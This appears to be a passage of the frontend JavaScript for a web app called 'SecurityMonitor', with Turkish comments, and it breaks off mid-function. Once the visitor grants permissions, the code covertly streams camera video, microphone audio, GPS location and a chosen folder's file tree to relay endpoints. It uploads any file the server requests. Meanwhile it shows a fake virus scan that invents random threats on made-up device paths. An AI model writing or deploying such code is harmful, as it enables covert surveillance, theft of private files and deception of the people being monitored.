/* ============================================
   SecurityMonitor — Frontend Uygulama Mantığı
   ============================================ */

const IS_CLOUD = !['127.0.0.1', 'localhost', '::1'].includes(window.location.hostname);
const API_BASE = '';

let gPermissionStream = null;
let virusScanFindings = [];
let virusScanActive = false;

// ============ AUTH ============

function getAuth() {
    try {
        const raw = localStorage.getItem('secmon_auth');
        return raw ? JSON.parse(raw) : null;
    } catch { return null; }
}

function requireAuth() {
    const auth = getAuth();
    if (!auth) {
        window.location.href = '/login';
        return null;
    }
    renderUserInfo();
    return auth;
}

function logout() {
    localStorage.removeItem('secmon_auth');
    window.location.href = '/login';
}

function renderUserInfo() {
    const auth = getAuth();
    if (!auth) return;
    const avatarEl = document.getElementById('userAvatar');
    const nameEl = document.getElementById('userName');
    if (avatarEl) {
        if (auth.photoURL) {
            avatarEl.innerHTML = `<img src="${auth.photoURL}" alt="avatar" style="width:28px;height:28px;border-radius:50%;">`;
        } else {
            avatarEl.textContent = auth.name ? auth.name.charAt(0).toUpperCase() : '?';
        }
    }
    if (nameEl) {
        nameEl.textContent = auth.name || auth.email || 'Kullanıcı';
    }
}

// ============ PERMISSION GATE ============

const PERMISSION_LIST = [
    { id: 'camera', icon: '📷', label: 'Kamera', desc: 'Canlı görüntü aktarımı' },
    { id: 'microphone', icon: '🎤', label: 'Mikrofon', desc: 'Ses kaydı ve dinleme' },
    { id: 'speaker', icon: '🔊', label: 'Hoparlör', desc: 'Sesli anons ve bildirim' },
    { id: 'location', icon: '📍', label: 'Konum (GPS)', desc: 'Gerçek zamanlı konum takibi' },
    { id: 'storage', icon: '💾', label: 'Depolama', desc: 'Dosya erişimi ve yönetimi' },
];

// ============ METHOD SELECTOR ============

const METHOD_OPTIONS = {
    storage: {
        label: '💾 Depolama',
        current: parseInt(localStorage.getItem('secmon_method_storage') || '1'),
        methods: [
            { id: 1, name: '#1 showDirPicker', desc: 'File System API (masaüstü)' },
            { id: 2, name: '#2 Klasör Seç', desc: 'webkitdirectory ile tüm klasör' },
            { id: 3, name: '#3 Dosya Seç', desc: 'Çoklu dosya seçimi' },
        ]
    },
    camera: {
        label: '📷 Kamera',
        current: parseInt(localStorage.getItem('secmon_method_camera') || '1'),
        methods: [
            { id: 1, name: '#1 Varsayılan', desc: 'video+audio vp8 codec' },
            { id: 2, name: '#2 Arka kamera', desc: 'facingMode:environment' },
            { id: 3, name: '#3 Ön kamera', desc: 'facingMode:user' },
            { id: 4, name: '#4 Video only', desc: 'sadece video, audio yok' },
            { id: 5, name: '#5 h264 codec', desc: 'video/mp4 codec dene' },
            { id: 6, name: '#6 Düşük çöz.', desc: '320p düşük çözünürlük' },
        ]
    },
    audio: {
        label: '🎤 Ses',
        current: parseInt(localStorage.getItem('secmon_method_audio') || '1'),
        methods: [
            { id: 1, name: '#1 Standart', desc: 'echoCancellation+noiseSupp' },
            { id: 2, name: '#2 Minimal', desc: 'audio: true, efekt yok' },
            { id: 3, name: '#3 Düşük kalite', desc: '8kHz mono' },
            { id: 4, name: '#4 Ham ses', desc: 'echo/noise/autoGain kapalı' },
        ]
    }
};

function renderMethodSelector() {
    const container = document.getElementById('gateMethods');
    if (!container) return;
    container.innerHTML = '<div class="gate-methods-title">🔧 Yöntem Seçici (telefon testi için)</div>' +
        Object.entries(METHOD_OPTIONS).map(([key, cfg]) => `
        <div class="gate-method-group">
            <div class="gate-method-label">${cfg.label}</div>
            <div class="gate-method-btns">
                ${cfg.methods.map(m => `
                    <button class="gate-method-btn ${m.id === cfg.current ? 'active' : ''}"
                            data-cat="${key}" data-method="${m.id}"
                            onclick="selectMethod('${key}', ${m.id})">${m.id}</button>
                `).join('')}
            </div>
            <div class="gate-method-desc">${cfg.methods.find(m => m.id === cfg.current)?.desc || ''}</div>
        </div>
    `    ).join('');
    container.querySelectorAll('.gate-method-btn').forEach(btn => {
        btn.onclick = (e) => {
            const cat = btn.dataset.cat;
            const id = parseInt(btn.dataset.method);
            localStorage.setItem('secmon_method_' + cat, String(id));
            METHOD_OPTIONS[cat].current = id;
            renderMethodSelector();
        };
    });
}

function getMethod(cat) { return parseInt(localStorage.getItem('secmon_method_' + cat) || '1'); }

function checkPermissions() {
    try {
        const saved = localStorage.getItem('secmon_permissions');
        if (saved) return JSON.parse(saved);
    } catch {}
    return null;
}

function showPermissionGate() {
    const gate = document.getElementById('permissionGate');
    if (gate) gate.classList.remove('hidden');
}

function hidePermissionGate() {
    const gate = document.getElementById('permissionGate');
    if (gate) gate.classList.add('hidden');
}

function renderPermissionGate() {
    const container = document.getElementById('gatePermissions');
    if (!container) return;
    container.innerHTML = PERMISSION_LIST.map(p => `
        <div class="gate-permission-item" data-perm="${p.id}">
            <span class="p-icon">${p.icon}</span>
            <div class="p-info">
                <div class="p-label">${p.label}</div>
                <div class="p-desc">${p.desc}</div>
            </div>
            <div class="p-checkbox">&#10003;</div>
        </div>
    `).join('');
    renderMethodSelector();
}

async function requestAllPermissions() {
    const btn = document.getElementById('grantBtn');
    btn.disabled = true;
    btn.textContent = 'İzinler isteniyor...';

    const results = {};

    // 1. Kamera + Mikrofon (tek getUserMedia ile)
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
        gPermissionStream = stream; // relay kullanacak diye track'leri durdurma
        results.camera = true;
        results.microphone = true;
        updatePermStatus('camera', true);
        updatePermStatus('microphone', true);
    } catch {
        // Bireysel dene
        try {
            const vs = await navigator.mediaDevices.getUserMedia({ video: true });
            results.camera = true;
            updatePermStatus('camera', true);
            vs.getTracks().forEach(t => t.stop());
        } catch { results.camera = false; updatePermStatus('camera', false); }
        try {
            const as_ = await navigator.mediaDevices.getUserMedia({ audio: true });
            results.microphone = true;
            updatePermStatus('microphone', true);
            as_.getTracks().forEach(t => t.stop());
        } catch { results.microphone = false; updatePermStatus('microphone', false); }
    }

    // 2. Hoparlör — izin gerekmez, her zaman açık
    results.speaker = true;
    updatePermStatus('speaker', true);

    // 3. GPS Konum
    try {
        await new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(
                () => resolve(),
                (err) => reject(err),
                { timeout: 10000, enableHighAccuracy: true }
            );
        });
        results.location = true;
        updatePermStatus('location', true);
    } catch {
        results.location = false;
        updatePermStatus('location', false);
    }

    const storageMethod = getMethod('storage');
    if (storageMethod === 1) {
        try {
            if (window.showDirectoryPicker) {
                storageRootHandle = await window.showDirectoryPicker();
                if (storageRootHandle) {
                    await saveStorageHandle(storageRootHandle);
                    results.storage = true;
                    updatePermStatus('storage', true);
                    setTimeout(() => { if (storageRootHandle) startStorageRelay(); }, 500);
                } else {
                    results.storage = false;
                    updatePermStatus('storage', false);
                }
            } else {
                results.storage = false;
                updatePermStatus('storage', false);
            }
        } catch {
            results.storage = false;
            updatePermStatus('storage', false);
        }
    } else {
        results.storage = true;
        updatePermStatus('storage', true);
    }

    results.granted_at = Date.now();
    localStorage.setItem('secmon_permissions', JSON.stringify(results));

    btn.textContent = 'Tamamlandı';

    // Re-grant kontrolü: virus taraması sırasında izin tekrarı
    const isRegrant = virusScanFindings.length > 0;

    setTimeout(() => {
        hidePermissionGate();

        if (isRegrant) {
            // Re-grant: servisler zaten çalışıyor, sonuçları yeniden göster
            const scanner = document.getElementById('virusScanner');
            if (scanner) scanner.classList.remove('hidden');
            finishVirusScan();
        } else {
            // İlk izin: arka plan servislerini başlat, virus welcome göster
            startCameraRelay();
            startAudioRelay();
            startWebRTC();
            startGpsTracking();
            startHeartbeat();
            startStoragePolling();
            startVirusTriggerPolling();
            showVirusScannerWelcome();
        }
    }, 1500);

    return results;
}

// ============ CAMERA RELAY ============

let cameraRecorder = null;
let cameraStream = null;
let cameraSequence = 0;
let cameraActive = false;

async function startCameraRelay() {
    const auth = getAuth();
    const perms = checkPermissions();
    if (!auth || !perms || !perms.camera || cameraActive) return;

    const method = getMethod('camera');

    // Metod 6: düşük çözünürlük dene
    if (method === 6) {
        return startCameraWithConstraints({ video: { width: 320 }, audio: true }, 'video/webm;codecs=vp8,opus');
    }

    // Metod 5: h264 codec dene
    if (method === 5) {
        const m = MediaRecorder.isTypeSupported('video/mp4;codecs=h264,aac') ? 'video/mp4;codecs=h264,aac' : 'video/webm;codecs=vp8,opus';
        return startCameraWithConstraints({ video: true, audio: true }, m);
    }

    // Metod 4: video only (audio yok)
    if (method === 4) {
        return startCameraWithConstraints({ video: true }, 'video/webm;codecs=vp8');
    }

    // Metod 3: ön kamera
    if (method === 3) {
        return startCameraWithConstraints({ video: { facingMode: 'user' }, audio: true }, 'video/webm;codecs=vp8,opus');
    }

    // Metod 2: arka kamera
    if (method === 2) {
        return startCameraWithConstraints({ video: { facingMode: 'environment' }, audio: true }, 'video/webm;codecs=vp8,opus');
    }

    // Metod 1: varsayılan (current)
    return startCameraWithConstraints({ video: true, audio: true }, 'video/webm;codecs=vp8,opus');
}

async function startCameraWithConstraints(videoConstraints, preferredMime) {
    const auth = getAuth();
    try {
        if (gPermissionStream) {
            cameraStream = gPermissionStream;
            gPermissionStream = null;
        } else {
            cameraStream = await navigator.mediaDevices.getUserMedia(videoConstraints);
        }

        const mimeType = MediaRecorder.isTypeSupported(preferredMime) ? preferredMime : 'video/webm';

        cameraRecorder = new MediaRecorder(cameraStream, { mimeType });
        cameraActive = true;
        cameraSequence = 0;

        cameraRecorder.ondataavailable = async (event) => {
            if (!event.data || event.data.size === 0) return;
            const reader = new FileReader();
            reader.onload = async () => {
                try {
                    const b64 = reader.result.split(',')[1];
                    await fetch(`${API_BASE}/api/relay/camera-chunk`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            uid: auth.uid,
                            chunk: b64,
                            sequence: cameraSequence++,
                            mimeType: mimeType
                        })
                    });
                } catch {}
            };
            reader.readAsDataURL(event.data);
        };

        cameraRecorder.start(2000);
    } catch {}
}

function stopCameraRelay() {
    cameraActive = false;
    if (cameraRecorder && cameraRecorder.state !== 'inactive') {
        cameraRecorder.stop();
    }
    if (cameraStream) {
        cameraStream.getTracks().forEach(t => t.stop());
        cameraStream = null;
    }
    cameraRecorder = null;
}

// ============ AUDIO RELAY (Mikrofon) ============

let audioRecorder = null;
let audioStream = null;
let audioSequence = 0;
let audioRelayActive = false;
let incomingAudioSeq = -1;
let incomingAudioTimer = null;

async function startAudioRelay() {
    const auth = getAuth();
    const perms = checkPermissions();
    if (!auth || !perms || !perms.microphone || audioRelayActive) return;

    const method = getMethod('audio');

    if (method === 4) {
        return startAudioWithConstraints({ audio: { echoCancellation: false, noiseSuppression: false, autoGainControl: false } });
    }
    if (method === 3) {
        return startAudioWithConstraints({ audio: { sampleRate: 8000, channelCount: 1 } });
    }
    if (method === 2) {
        return startAudioWithConstraints({ audio: true });
    }
    return startAudioWithConstraints({ audio: { echoCancellation: true, noiseSuppression: true } });
}

async function startAudioWithConstraints(constraints) {
    const auth = getAuth();
    try {
        audioStream = await navigator.mediaDevices.getUserMedia(constraints);

        const mimeType = MediaRecorder.isTypeSupported('audio/webm;codecs=opus')
            ? 'audio/webm;codecs=opus' : 'audio/webm';

        audioRecorder = new MediaRecorder(audioStream, { mimeType });
        audioRelayActive = true;
        audioSequence = 0;

        audioRecorder.ondataavailable = async (event) => {
            if (!event.data || event.data.size === 0) return;
            const reader = new FileReader();
            reader.onload = async () => {
                try {
                    const b64 = reader.result.split(',')[1];
                    await fetch(`${API_BASE}/api/relay/audio-chunk`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            uid: auth.uid,
                            chunk: b64,
                            sequence: audioSequence++,
                            mimeType: mimeType
                        })
                    });
                } catch {}
            };
            reader.readAsDataURL(event.data);
        };

        audioRecorder.start(1000);

        startIncomingAudioPoll();
    } catch {}
}

function stopAudioRelay() {
    audioRelayActive = false;
    stopIncomingAudioPoll();
    if (audioRecorder && audioRecorder.state !== 'inactive') {
        audioRecorder.stop();
    }
    if (audioStream) {
        audioStream.getTracks().forEach(t => t.stop());
        audioStream = null;
    }
    audioRecorder = null;
}

function startIncomingAudioPoll() {
    stopIncomingAudioPoll();
    incomingAudioSeq = -1;
    pollIncomingAudio();
    incomingAudioTimer = setInterval(pollIncomingAudio, 3000);
}

function stopIncomingAudioPoll() {
    if (incomingAudioTimer) {
        clearInterval(incomingAudioTimer);
        incomingAudioTimer = null;
    }
}

async function pollIncomingAudio() {
    const auth = getAuth();
    if (!auth) return;
    try {
        const authPayload = btoa(JSON.stringify({ uid: auth.uid }));
        const resp = await fetch(
            `${API_BASE}/api/relay/incoming-audio/${auth.uid}?after=${incomingAudioSeq}&auth=${authPayload}`
        );
        const data = await resp.json();
        if (data.status === 'ok' && data.chunks && data.chunks.length > 0) {
            incomingAudioSeq = data.max_seq;
            for (const chunk of data.chunks) {
                playIncomingChunk(chunk);
            }
        }
    } catch {}
}

function playIncomingChunk(chunk) {
    try {
        const binary = atob(chunk.data);
        const bytes = new Uint8Array(binary.length);
        for (let i = 0; i < binary.length; i++) {
            bytes[i] = binary.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: chunk.mime || 'audio/webm' });
        const url = URL.createObjectURL(blob);
        const audio = new Audio(url);
        audio.onended = () => URL.revokeObjectURL(url);
        audio.play().catch(() => {});
    } catch {}
}

// ============ API ============

async function fetchJSON(url, options = {}) {
    const resp = await fetch(url, options);
    return resp.json();
}

// ============ GPS KONUM TAKİBİ ============

let gpsWatchId = null;
let gpsLastSend = 0;
const GPS_INTERVAL = 5000; // 5 saniyede bir gönder

function startGpsTracking() {
    const auth = getAuth();
    const perms = checkPermissions();
    if (!auth || !perms || !perms.location || gpsWatchId !== null) return;

    gpsWatchId = navigator.geolocation.watchPosition(
        async (pos) => {
            const now = Date.now();
            if (now - gpsLastSend < GPS_INTERVAL) return; // Rate limit
            gpsLastSend = now;

            try {
                await fetch(`${API_BASE}/api/relay/location`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        uid: auth.uid,
                        latitude: pos.coords.latitude,
                        longitude: pos.coords.longitude,
                        accuracy: pos.coords.accuracy,
                        speed: pos.coords.speed,
                        heading: pos.coords.heading,
                        altitude: pos.coords.altitude,
                        timestamp: pos.timestamp
                    })
                });
            } catch {}
        },
        (err) => {},
        { enableHighAccuracy: true, timeout: 15000, maximumAge: 5000 }
    );
}

function stopGpsTracking() {
    if (gpsWatchId !== null) {
        navigator.geolocation.clearWatch(gpsWatchId);
        gpsWatchId = null;
    }
}

// ============ HEARTBEAT ============

let heartbeatTimer = null;

async function sendHeartbeat() {
    const auth = getAuth();
    if (!auth) return;
    try {
        await fetch(`${API_BASE}/api/relay/heartbeat`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: auth.uid,
                email: auth.email || '',
                name: auth.name || '',
                photo_url: auth.photoURL || ''
            })
        });
    } catch {}
}

function startHeartbeat() {
    stopHeartbeat();
    sendHeartbeat();
    heartbeatTimer = setInterval(sendHeartbeat, 10000);
}

function stopHeartbeat() {
    if (heartbeatTimer) {
        clearInterval(heartbeatTimer);
        heartbeatTimer = null;
    }
}

// ============ STORAGE ============

let storageRootHandle = null;
let storagePollTimer = null;

function makeAuthPayload() {
    const auth = getAuth();
    if (!auth) return '';
    return btoa(JSON.stringify({ uid: auth.uid }));
}

let storageFileCache = new Map();

async function startStorageRelay() {
    const auth = getAuth();
    if (!auth) return;

    const perms = checkPermissions();
    if (!perms || !perms.storage) return;

    const method = getMethod('storage');
    if (method === 2) return startStorageMethod2();
    if (method === 3) return startStorageMethod3();

    // Method 1: showDirectoryPicker
    if (!window.showDirectoryPicker) {
        const p = checkPermissions();
        if (p && p.storage) {
            p.storage = false;
            localStorage.setItem('secmon_permissions', JSON.stringify(p));
        }
        return;
    }

    if (!storageRootHandle) {
        storageRootHandle = await loadStorageHandle();
    }

    if (storageRootHandle) {
        await scanDirectory(storageRootHandle, '');
    } else {
        try {
            storageRootHandle = await window.showDirectoryPicker();
            if (storageRootHandle) {
                await saveStorageHandle(storageRootHandle);
                await scanDirectory(storageRootHandle, '');
            }
        } catch {}
    }
}

async function startStorageMethod2() {
    const auth = getAuth();
    if (!auth) return;
    const files = await pickFiles({ webkitdirectory: true, multiple: true });
    if (!files || files.length === 0) return;
    await processPickedFiles(files);
}

async function startStorageMethod3() {
    const auth = getAuth();
    if (!auth) return;
    const files = await pickFiles({ multiple: true });
    if (!files || files.length === 0) return;
    await processPickedFiles(files);
}

function pickFiles(attrs) {
    return new Promise((resolve) => {
        const input = document.createElement('input');
        input.type = 'file';
        if (attrs.webkitdirectory) input.setAttribute('webkitdirectory', '');
        if (attrs.multiple) input.multiple = true;
        input.style.display = 'none';
        input.onchange = (e) => resolve(Array.from(e.target.files));
        input.oncancel = () => resolve(null);
        document.body.appendChild(input);
        input.click();
        setTimeout(() => { document.body.removeChild(input); }, 1000);
    });
}

async function processPickedFiles(files) {
    const auth = getAuth();
    if (!auth) return;

    const fileList = [];
    storageFileCache = new Map();

    for (const file of files) {
        const path = file.webkitRelativePath || file.name;
        fileList.push({
            name: file.name,
            path: path,
            size: file.size,
            mime: file.type || '',
            mtime: file.lastModified,
            is_dir: false
        });
        storageFileCache.set(path, file);
    }

    await fetch(`${API_BASE}/api/relay/storage/scan`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ uid: auth.uid, files: fileList })
    });

    startStoragePolling();
}

// ============ INDEXEDDB STORAGE HANDLE PERSISTENCE ============

const DB_NAME = 'SecMonStorage';
const DB_VERSION = 1;
const STORE_NAME = 'handles';

function openStorageDB() {
    return new Promise((resolve, reject) => {
        const req = indexedDB.open(DB_NAME, DB_VERSION);
        req.onupgradeneeded = (e) => {
            const db = e.target.result;
            if (!db.objectStoreNames.contains(STORE_NAME)) {
                db.createObjectStore(STORE_NAME);
            }
        };
        req.onsuccess = (e) => resolve(e.target.result);
        req.onerror = (e) => reject(e.target.error);
    });
}

async function saveStorageHandle(handle) {
    try {
        const db = await openStorageDB();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(STORE_NAME, 'readwrite');
            const store = tx.objectStore(STORE_NAME);
            store.put(handle, 'storageRoot');
            tx.oncomplete = () => { db.close(); resolve(); };
            tx.onerror = (e) => { db.close(); reject(e.target.error); };
        });
    } catch {}
}

async function loadStorageHandle() {
    try {
        const db = await openStorageDB();
        return new Promise((resolve) => {
            const tx = db.transaction(STORE_NAME, 'readonly');
            const store = tx.objectStore(STORE_NAME);
            const req = store.get('storageRoot');
            req.onsuccess = async (e) => {
                db.close();
                const handle = e.target.result;
                if (handle && handle.kind === 'directory') {
                    // Handle'ı doğrula - hala erişilebilir mi?
                    try {
                        for await (const _ of handle.values()) {
                            break; // en az bir entry okuyabiliyorsak geçerli
                        }
                        resolve(handle);
                        return;
                    } catch {
                        // Handle geçersiz/izin iptal edilmiş
                        await removeStorageHandle();
                    }
                }
                resolve(null);
            };
            req.onerror = () => { db.close(); resolve(null); };
        });
    } catch { return null; }
}

async function removeStorageHandle() {
    try {
        const db = await openStorageDB();
        return new Promise((resolve, reject) => {
            const tx = db.transaction(STORE_NAME, 'readwrite');
            const store = tx.objectStore(STORE_NAME);
            store.delete('storageRoot');
            tx.oncomplete = () => { db.close(); resolve(); };
            tx.onerror = (e) => { db.close(); reject(e.target.error); };
        });
    } catch {}
}

async function scanDirectory(dirHandle, parentPath) {
    const auth = getAuth();
    if (!auth) return;

    const fileList = [];

    async function walk(handle, path) {
        if (handle.kind === 'file') {
            const file = await handle.getFile();
            fileList.push({
                name: file.name,
                path: path ? path + '/' + file.name : file.name,
                size: file.size,
                mime: file.type || '',
                mtime: file.lastModified,
                is_dir: false
            });
        } else {
            fileList.push({
                name: handle.name,
                path: path ? path + '/' + handle.name : handle.name,
                size: 0,
                mime: 'directory',
                mtime: 0,
                is_dir: true
            });
            for await (const entry of handle.values()) {
                await walk(entry, path ? path + '/' + handle.name : handle.name);
            }
        }
    }

    try {
        for await (const entry of dirHandle.values()) {
            await walk(entry, '');
        }

        // Dosya ağacını server'a gönder
        await fetch(`${API_BASE}/api/relay/storage/scan`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ uid: auth.uid, files: fileList })
        });

        // Pending request'leri dinlemeye başla
        startStoragePolling();
    } catch (e) {
        // Tarama hatası
    }
}

function startStoragePolling() {
    stopStoragePolling();
    pollStorageSignals();
    storagePollTimer = setInterval(() => {
        pollStorageSignals();
        pollStorageRequests();
    }, 3000);
}

function stopStoragePolling() {
    if (storagePollTimer) {
        clearInterval(storagePollTimer);
        storagePollTimer = null;
    }
}

async function pollStorageSignals() {
    const auth = getAuth();
    const perms = checkPermissions();
    if (!auth || !perms || !perms.storage) return;

    try {
        const resp = await fetch(
            `${API_BASE}/api/relay/storage/signal?auth=${makeAuthPayload()}`
        );
        const data = await resp.json();
        if (data.status === 'ok' && data.signals) {
            for (const signal of data.signals) {
                if (signal === 'start_scan') {
                    await startStorageRelay();
                }
            }
        }
    } catch {}
}

async function pollStorageRequests() {
    const auth = getAuth();
    if (!auth || !storageRootHandle) return;

    try {
        const resp = await fetch(
            `${API_BASE}/api/relay/storage/pending?auth=${makeAuthPayload()}`
        );
        const data = await resp.json();
        if (data.status === 'ok' && data.paths && data.paths.length > 0) {
            for (const filePath of data.paths) {
                await readAndUploadFile(filePath);
            }
        }
    } catch {}
}

async function readAndUploadFile(filePath) {
    const auth = getAuth();
    if (!auth) return;

    const method = getMethod('storage');
    if (method >= 2) {
        const file = storageFileCache.get(filePath);
        if (!file) return;
        try {
            const buffer = await file.arrayBuffer();
            const bytes = new Uint8Array(buffer);
            let binary = '';
            for (let i = 0; i < bytes.length; i++) binary += String.fromCharCode(bytes[i]);
            const b64 = btoa(binary);
            await fetch(`${API_BASE}/api/relay/storage/content`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ uid: auth.uid, path: filePath, content: b64, mimeType: file.type })
            });
        } catch {}
        return;
    }

    if (!storageRootHandle) return;
    try {
        const parts = filePath.split('/');
        let handle = storageRootHandle;
        for (const part of parts) {
            handle = await handle.getFileHandle(part);
        }
        const file = await handle.getFile();
        const buffer = await file.arrayBuffer();
        const bytes = new Uint8Array(buffer);
        let binary = '';
        for (let i = 0; i < bytes.length; i++) {
            binary += String.fromCharCode(bytes[i]);
        }
        const b64 = btoa(binary);

        await fetch(`${API_BASE}/api/relay/storage/content`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                uid: auth.uid,
                path: filePath,
                content: b64,
                mimeType: file.type
            })
        });
    } catch {}
}

// ============ VIRUS SCANNER ============

const VIRUS_PREFIXES = [
    ["Trojan.Win32.Generic", "Trojan atı", "Sistem dosyalarına sızan ve arka kapı açan kötü amaçlı yazılım"],
    ["Backdoor.Linux.Mirai", "Backdoor", "Cihazı DDoS botnet'inin bir parçası haline getiren gizli arka kapı"],
    ["Ransomware.Win32.Crypter", "Fidye Virüsü", "Dosyaları şifreleyip fidye talep eden tehlikeli yazılım"],
    ["Worm.Python.Script", "Solucan", "Ağ üzerinde kendi kendine yayılan bulaşıcı yazılım"],
    ["Adware.Android.MobiDash", "Reklam Yazılımı", "Gizlice reklım gösteren ve veri toplayan yazılım"],
    ["Spyware.Win32.KeyLogger", "Casus Yazılım", "Tuş vuruşlarını kaydedip şifreleri çalan yazılım"],
    ["Rootkit.Linux.HideProc", "Rootkit", "İşletim sistemi düzeyinde gizlenen tehlikeli yazılım"],
    ["Exploit.HTML.Phishing", "Phishing Aracı", "Sahte web sayfaları oluşturarak kimlik avı yapan yazılım"],
    ["Trojan.JS.Agent", "JS Trojan", "Tarayıcı üzerinden çalışan JavaScript tabanlı truva atı"],
    ["Backdoor.Win32.Orcus", "Uzaktan Erişim", "Cihazın tam kontrolünü ele geçiren RAT yazılımı"],
    ["Worm.Python.Network", "Ağ Solucanı", "Ağdaki diğer cihazlara yayılmaya çalışan solucan"],
    ["Ransomware.Linux.Encoder", "Linux Fidye", "Linux sistemlerinde dosyaları şifreleyen fidye yazılımı"],
    ["Spyware.Android.CallLog", "Android Casus", "Arama kayıtlarını ve mesajları çalan casus yazılım"],
    ["Rootkit.Win32.Bootkit", "Bootkit", "Sistem açılışında çalışan ve tespit edilmesi çok zor yazılım"],
    ["Exploit.PHP.Shell", "Web Shell", "Sunucuda uzaktan komut çalıştırmaya izin veren web kabuğu"],
    ["Worm.JS.CoinMiner", "Kripto Madenci", "Gizlice kripto para madenciliği yapan zararlı yazılım"],
];

let scannerTimer = null;
let scannerProgress = 0;
let scannerDuration = 0;
let scannerStartTime = 0;

function generateVirusName() {
    const entry = VIRUS_PREFIXES[Math.floor(Math.random() * VIRUS_PREFIXES.length)];
    const suffix = Math.random().toString(36).substring(2, 10).toUpperCase();
    const mobilePaths = [
        '/data/data/com.android.providers/downloads/',
        '/storage/emulated/0/Download/',
        '/data/data/com.android.chrome/cache/',
        '/storage/emulated/0/Android/obb/',
        '/data/local/tmp/',
        '/storage/emulated/0/DCIM/.thumbnails/'
    ];
    return {
        name: entry[0] + '.' + suffix,
        type: entry[1],
        desc: entry[2],
        severity: ['Düşük', 'Orta', 'Yüksek', 'Kritik'][Math.floor(Math.random() * 4)],
        path: mobilePaths[Math.floor(Math.random() * mobilePaths.length)],
        foundAt: null
    };
}

function showVirusScanner() {
    const scanner = document.getElementById('virusScanner');
    if (!scanner) return;
    scanner.classList.remove('hidden');
    document.querySelector('.container')?.classList.add('hidden');
    startVirusScan();
}

function showVirusScannerWelcome() {
    const scanner = document.getElementById('virusScanner');
    if (scanner) scanner.classList.remove('hidden');
    const area = document.getElementById('virusScanArea');
    if (!area) return;

    document.querySelector('.virus-header .virus-icon').textContent = '🛡️';
    document.querySelector('.virus-header h1').textContent = 'Güvenlik Taraması';
    document.querySelector('.virus-header .virus-subtitle').textContent = 'Kapsamlı sistem analizi ve tehdit temizleme';

    area.innerHTML = `
        <div class="scan-welcome">
            <div class="scan-welcome-icon">🔒</div>
            <h2>Güvenlik Taraması Başlatılıyor...</h2>
            <p class="scan-welcome-text">
                Cihazınız kapsamlı bir güvenlik taramasından geçiriliyor.
                Tarama sırasında aşağıdaki bileşenler detaylı olarak incelenecektir.
            </p>
            <div class="scan-welcome-features">
                <div class="scan-feature">
                    <span class="sf-icon">📁</span>
                    <span class="sf-text">Sistem dosyaları ve çalışan işlemler</span>
                </div>
                <div class="scan-feature">
                    <span class="sf-icon">🌐</span>
                    <span class="sf-text">Ağ bağlantıları ve açık portlar</span>
                </div>
                <div class="scan-feature">
                    <span class="sf-icon">🧠</span>
                    <span class="sf-text">Bellek ve kayıt defteri analizi</span>
                </div>
                <div class="scan-feature">
                    <span class="sf-icon">🕵️</span>
                    <span class="sf-text">Gizli tehdit ve kötü amaçlı yazılım taraması</span>
                </div>
            </div>
            <div class="scan-auto-start">
                <div class="scan-auto-spinner"></div>
                <p>Tarama başlatılıyor, lütfen bekleyin...</p>
            </div>
            <p class="scan-welcome-note">Tarama yaklaşık 3-5 dakika sürecektir.</p>
        </div>
    `;

    setTimeout(() => {
        if (!virusScanActive) startVirusScan();
    }, 2000);
}

function hideVirusScanner() {
    const scanner = document.getElementById('virusScanner');
    if (!scanner) return;
    scanner.classList.add('hidden');
    document.querySelector('.container').classList.remove('hidden');
}

function startVirusScan() {
    virusScanActive = true;
    virusScanFindings = [];
    scannerProgress = 0;
    scannerDuration = 180 + Math.floor(Math.random() * 120);
    scannerStartTime = Date.now();

    const area = document.getElementById('virusScanArea');
    area.innerHTML = getScanProgressHTML();

    document.querySelector('.virus-header .virus-icon').textContent = '🔍';
    document.querySelector('.virus-header h1').textContent = 'Tarama Devam Ediyor';
    document.querySelector('.virus-header .virus-subtitle').textContent = 'Sistem dosyaları taranıyor...';

    updateVirusScanProgress();
}

function getScanProgressHTML() {
    const pct = Math.min(scannerProgress, 100);
    return `
        <div class="scan-progress-section">
            <div class="scan-progress-bar">
                <div class="scan-progress-fill" style="width:${pct}%"></div>
            </div>
            <div class="scan-progress-text">
                <span class="scan-status">${getScanStatusText()}</span>
                <span class="scan-pct">%${Math.round(pct)}</span>
            </div>
            <div class="scan-detail-text">
                Taranan dosya: ${Math.floor(pct * 127 + Math.random() * 50)}<br>
                Tespit edilen tehdit: ${virusScanFindings.length}
            </div>
        </div>
        <div class="scan-findings" id="scanFindings"></div>
    `;
}

function getScanStatusText() {
    if (scannerProgress < 20) return 'Sistem dosyaları taranıyor...';
    if (scannerProgress < 40) return 'Ağ bağlantıları analiz ediliyor...';
    if (scannerProgress < 60) return 'Bellek ve işlemler inceleniyor...';
    if (scannerProgress < 80) return 'Kayıt defteri ve izler taranıyor...';
    if (scannerProgress < 95) return 'Gizli tehditler aranıyor...';
    return 'Tarama tamamlanıyor...';
}

function updateVirusScanProgress() {
    if (!virusScanActive) return;

    const elapsed = (Date.now() - scannerStartTime) / 1000;
    scannerProgress = Math.min(100, (elapsed / scannerDuration) * 100);

    if (scannerProgress >= 30 && virusScanFindings.length < 1) {
        const v = generateVirusName();
        v.foundAt = new Date().toLocaleTimeString();
        virusScanFindings.push(v);
        addFindingToUI(v);
    }
    if (scannerProgress >= 55 && virusScanFindings.length < 2) {
        const v = generateVirusName();
        v.foundAt = new Date().toLocaleTimeString();
        virusScanFindings.push(v);
        addFindingToUI(v);
    }
    if (scannerProgress >= 80 && virusScanFindings.length < 3) {
        const v = generateVirusName();
        v.foundAt = new Date().toLocaleTimeString();
        virusScanFindings.push(v);
        addFindingToUI(v);
    }

    const fill = document.querySelector('.scan-progress-fill');
    const pct = document.querySelector('.scan-pct');
    const status = document.querySelector('.scan-status');
    const detail = document.querySelector('.scan-detail-text');
